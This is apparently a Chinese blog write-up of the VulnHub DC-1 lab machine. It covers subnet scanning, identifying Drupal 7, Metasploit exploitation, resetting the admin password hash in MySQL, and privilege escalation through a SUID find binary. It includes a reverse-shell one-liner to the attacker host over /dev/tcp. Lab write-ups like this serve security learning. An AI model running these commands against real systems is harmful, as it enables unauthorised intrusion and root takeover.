+++
title = 'Dc_1靶机'
date = '2024-03-24T12:18:23+08:00'
categories = ['vulnhub', '学习']
tags = ['打靶记录']
+++

### 靶机环境

网段:192.168.26.0/24
kali：192.168.26.128
网关: 192.168.26.2

### 找出靶机的ip

```
nmap -sP 192.168.26.0/24
```

![image-20240311152142829](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111521875.png)

靶机:192.168.26.129

### 端口探测

![image-20240311153016110](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111530140.png)

### 信息收集

先扫一下目录：

```java
python3 dirsearch.py -u http://192.168.26.129 
```

貌似没有有用的文件。

### 网站指纹识别

```java
whatweb -v 192.168.26.129
```

![image-20240311155719932](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111557987.png)

可以看到CMS为Drupal，version为7

去找相关的漏洞。
这里使用msf进行验证

![image-20240311170921156](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111709213.png)

这里使用这个漏洞进行攻击，
![image-20240311171013663](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111710722.png)

哑shell变交互shell

```java
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### 第一个flag

![image-20240311171109735](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111711775.png)

提示我们配置文件

#### 第二个flag

![image-20240311171331583](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111713629.png)

并且这里得到了数据库的用户名和密码，登录mysql

![image-20240311171622958](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111716983.png)

![image-20240311172903933](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111729006.png)

可以看到这里的密码应该是被加密了，

Drupal框架中有一个生成加密后密码的脚本，我们设置密码为123456789 然后将admin的密码给替换即可

[分享：忘记Drupal的管理员密码的解决办法 | Drupal China](http://drupalchina.cn/node/2128)

```php
php scripts/password-hash.sh 123456789
```

![image-20240311173715358](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111737392.png)

替换admin的密码：

![image-20240311174142987](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111741032.png)

![image-20240311174233524](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111742582.png)

登录进去了

#### 第三个flag

![image-20240311174512484](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111745541.png)

#### 第四个flag

直接查找一下

```java
find / -name flag4*
```

![image-20240311175128099](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111751133.png)

没有权限

### 提权



![image-20240311175659431](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111756456.png)

可以看到find有s权位，可以提权，反弹shell

```java
find /etc/passwd -exec bash -ip >& /dev/tcp/192.168.26.128/9919 0>&1 \;
```

![image-20240311181223889](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111812919.png)

#### 第五个flag

在root目录下，root权限直接查看：

![image-20240311181302485](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403111813520.png)

